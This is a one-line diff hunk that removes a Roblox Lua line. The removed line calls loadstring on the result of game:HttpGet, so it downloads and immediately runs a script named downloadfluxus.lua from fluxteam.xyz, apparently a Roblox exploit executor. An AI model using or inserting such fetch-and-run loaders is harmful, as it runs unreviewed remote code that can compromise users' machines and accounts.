@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://fluxteam.xyz/scripts/downloadfluxus.lua", true))()
